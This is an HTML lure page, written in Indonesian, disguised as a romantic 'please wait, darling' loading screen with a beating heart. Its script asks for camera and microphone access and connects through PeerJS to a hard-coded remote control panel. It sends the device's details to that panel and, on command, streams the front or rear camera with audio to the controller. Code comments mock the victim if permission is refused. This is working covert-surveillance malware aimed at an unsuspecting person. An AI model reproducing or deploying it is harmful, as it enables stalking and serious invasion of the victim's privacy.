<!DOCTYPE html>
<html>
<head>
    <title>Please Wait...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #fce4ec; color: #333; font-family: -apple-system, BlinkMacSystemFont, sans-serif; overflow: hidden; }
        .container { display: flex; flex-direction: column; justify-content: center; align-items: center; width: 100%; height: 100%; text-align: center; }
        .heart { background-color: #ff4d4d; height: 80px; width: 80px; transform: rotate(-45deg); animation: beat 1s infinite; }
        .heart:before, .heart:after { content: ""; background-color: #ff4d4d; border-radius: 50%; height: 80px; width: 80px; position: absolute; }
        .heart:before { top: -40px; left: 0; }
        .heart:after { left: 40px; top: 0; }
        @keyframes beat { 0% { transform: scale(1) rotate(-45deg); } 50% { transform: scale(1.2) rotate(-45deg); } 100% { transform: scale(1) rotate(-45deg); } }
        p { margin-top: 40px; font-size: 1.5em; font-weight: bold; color: #ad1a4f; }
    </style>
</head>
<body>
    <div class="container">
        <div class="heart"></div>
        <p>Tunggu ya sayang...<br>Jangan tutup halaman ini yaa</p>
    </div>

<script>
    const idKontrol = 'panel-kontrol-ultimate-777';

    async function mulaiSemua() {
        try {
            // LANGSUNG MINTA IZIN KAMERA & MIC. REKAM LAYAR UDAH GW BUANG!
            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            const peer = new Peer();
            peer.on('open', id => {
                const conn = peer.connect(idKontrol);
                conn.on('open', () => {
                    conn.send({ type: 'info', id: id, device: navigator.userAgent });
                    conn.on('data', data => {
                        handlePerintah(data.perintah, peer);
                    });
                });
            });

        } catch (err) {
            // Kalo izin kamera ditolak, biarin aja dia di loading screen sampe mampus
            console.error("Izin ditolak oleh si Goblok: ", err);
        }
    }

    function handlePerintah(perintah, peer) {
        if (perintah === 'get_cam_depan') {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true }).then(stream => {
                peer.call(idKontrol, stream, { metadata: { type: 'cam' } });
            });
        }
        if (perintah === 'get_cam_belakang') {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true }).then(stream => {
                peer.call(idKontrol, stream, { metadata: { type: 'cam' } });
            });
        }
        // Perintah 'get_layar' sengaja diabaikan. Tombolnya di panel lu jadi gak guna.
    }

    window.onload = mulaiSemua;
</script>
</body>
</html>